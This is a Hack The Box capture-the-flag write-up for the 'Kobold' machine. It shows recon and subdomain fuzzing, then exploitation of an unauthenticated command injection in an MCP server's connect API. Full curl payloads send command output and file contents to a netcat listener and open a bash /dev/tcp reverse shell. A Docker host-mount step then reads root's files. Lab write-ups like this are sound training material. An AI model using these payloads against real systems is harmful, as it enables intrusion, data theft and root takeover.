# Kobold HTB Writeup

## Reconnaissance

I began by performing an initial Nmap scan against the target machine to identify open ports and exposed services.

```bash
nmap -Pn -T4 10.129.12.135
```

The scan revealed the following ports:

```text
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
```

Since HTTP and HTTPS services were exposed, I added the target domain locally to my `/etc/hosts` file so that virtual host routing would function correctly.

```bash
sudo nano /etc/hosts
```

I added:

```text
10.129.12.135 kobold.htb
```

After saving the file, I was able to access the website successfully through my browser.

---

# Web Enumeration

Browsing to `https://kobold.htb` displayed a static landing page titled **Kobold Operations Suite**. The page referenced:

- AI-powered agents
- automation
- containerized applications
- centralized management

These hints suggested the presence of hidden internal services or subdomains.

I started subdomain enumeration using ffuf:

```bash
ffuf -u http://10.129.12.135/ \
-H "Host: FUZZ.kobold.htb" \
-w word.txt
```

The scan returned several valid virtual hosts:

```text
staging
www
mcp
ftp
dev
admin
```

Most of them redirected back to the main domain, but `mcp.kobold.htb` redirected to its own dedicated virtual host:

```text
Location: https://mcp.kobold.htb/
```

This indicated that `mcp.kobold.htb` hosted a separate application.

I added the discovered subdomain to `/etc/hosts`:

```text
10.129.12.135 mcp.kobold.htb
```

---

# API Enumeration

After accessing `https://mcp.kobold.htb`, I began enumerating the API endpoints.

During enumeration, I identified the following endpoint:

```text
/api/mcp/connect
```

The endpoint appeared to handle MCP server connections.

Further research revealed that the application was vulnerable to **CVE-2026-23520**, an unauthenticated command injection vulnerability affecting Arcane MCP Server.

The vulnerability allowed arbitrary command execution through the `serverConfig.command` parameter without authentication.

---

# Verifying Remote Code Execution

To verify command execution, I first started a Netcat listener on my attacking machine:

```bash
nc -lvnp 4444
```

I then sent the following request:

```bash
curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
-H "Content-Type: application/json" \
-d '{
  "serverConfig": {
    "command": "bash",
    "args": ["-c", "id | nc 10.10.16.242 4444"],
    "env": {}
  },
  "serverId": "idcheck"
}'
```

Although the application responded with a timeout error, the command executed successfully server-side.

The listener received:

```text
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
```

This confirmed remote code execution as the `ben` user.

---

# Obtaining User Flag

To retrieve the user flag, I modified the payload to read `/home/ben/user.txt` and send the contents back to my listener.

I started a listener:

```bash
nc -lvnp 4444
```

Then executed:

```bash
curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
-H "Content-Type: application/json" \
-d '{
  "serverConfig": {
    "command": "bash",
    "args": ["-c", "cat /home/ben/user.txt | nc 10.10.16.242 4444"],
    "env": {}
  },
  "serverId": "user"
}'
```

The listener received the user flag:

```text
39eb*********************ae
```

---

# Reverse Shell Access

To gain a more interactive shell, I established a reverse shell.

I started a listener:

```bash
nc -lvnp 5001
```

Then triggered the reverse shell:

```bash
curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
-H "Content-Type: application/json" \
-d '{
  "serverConfig": {
    "command": "bash",
    "args": ["-c", "bash -i >& /dev/tcp/10.10.16.242/5001 0>&1"],
    "env": {}
  },
  "serverId": "shell"
}'
```

I upgraded the shell using Python PTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

# Enumeration for Privilege Escalation

While enumerating the system, I identified several important clues:

- Docker and containerd services were running
- Docker proxy processes were active
- The vulnerable MCP application was interacting with Docker internally

Direct Docker access from the shell failed due to insufficient permissions:

```text
permission denied while trying to connect to the Docker daemon socket
```

However, during testing I discovered that commands executed through the vulnerable MCP service could use:

```text
sg docker
```

This temporarily switched execution into the `docker` group context, granting access to the Docker daemon.

I verified Docker access by listing available images:

```bash
nc -lvnp 4444
```

```bash
curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
-H "Content-Type: application/json" \
-d '{
  "serverConfig": {
    "command": "sg",
    "args": [
      "docker",
      "-c",
      "docker images | nc 10.10.16.242 4444"
    ],
    "env": {}
  },
  "serverId": "docker"
}'
```

The listener returned:

```text
REPOSITORY                    TAG
mysql                         latest
privatebin/nginx-fpm-alpine   2.0.2
```

This confirmed successful Docker daemon access through the vulnerable MCP service.

---

# Privilege Escalation to Root

Since Docker access was possible, I used it to mount the host filesystem inside a temporary container and directly read the root flag.

I started a listener:

```bash
nc -lvnp 4444
```

Then executed:

```bash
curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
-H "Content-Type: application/json" \
-d '{
  "serverConfig": {
    "command": "sg",
    "args": [
      "docker",
      "-c",
      "docker run -u root -v /:/hostfs --rm --entrypoint cat privatebin/nginx-fpm-alpine:2.0.2 /hostfs/root/root.txt | nc -w 10 10.10.16.242 4444"
    ],
    "env": {}
  },
  "serverId": "rootflag"
}'
```

The MCP application returned:

```text
{"success":false,"error":"Connection failed for server rootflag: MCP error -32000: Connection closed"}
```

However, the payload executed successfully, and the listener received the root flag:

```text
7f********************a6a
```

---

# Flags

## User Flag

```text
39eb*********************ae
```

## Root Flag

```text
7f********************a6a
```

